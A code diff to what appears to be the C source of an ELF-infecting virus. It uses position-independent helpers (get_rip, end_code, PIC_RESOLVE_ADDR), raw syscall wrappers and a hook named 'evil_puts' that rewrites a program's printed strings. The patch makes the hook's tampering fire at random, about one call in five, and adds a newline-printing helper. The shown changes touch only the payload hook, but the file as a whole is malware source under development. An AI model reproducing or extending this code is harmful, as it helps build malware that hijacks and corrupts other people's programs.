@@ -42,6 +42,7 @@ int _printf(char *, ...);
 char * itoa(long, char *);
 char * itox(long, char *);
 int _puts(char *);
+int _puts_nl(char *);
 size_t _strlen(char *);
 char *_strchr(const char *, int);
 char * _strrchr(const char *, int);
@@ -68,10 +69,12 @@ int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 int _rename(const char *, const char *);
 int _close(unsigned int);
 int _gettimeofday(struct timeval *, struct timezone *);
+
 /* Customs */
 unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
+static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
 
 #define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))
 
@@ -192,7 +195,10 @@ int evil_puts(const char *string)
 	char *s = (char *)string;
 	char new[1024];
 	int index = 0;
-	
+	int rnum = get_random_number(5);
+	if (rnum != 3)
+		goto normal;
+
 	Memset(new, 0, 1024);
 	while (*s != '\0' && index < 1024) {
 		switch(_toupper(*s)) {
@@ -220,7 +226,9 @@ int evil_puts(const char *string)
 		}
 		s++;
 	}
-	return _puts(new);
+	return _puts_nl(new);
+normal:
+	return _puts_nl((char *)string);
 }
 
 /*
@@ -1118,6 +1126,15 @@ int _puts(char *str)
 {
         _write(1, str, _strlen(str));
         _fsync(1);
+
+        return 1;
+}
+
+int _puts_nl(char *str)
+{	
+        _write(1, str, _strlen(str));
+	_write(1, "\n", 1);
+	_fsync(1);
 
         return 1;
 }
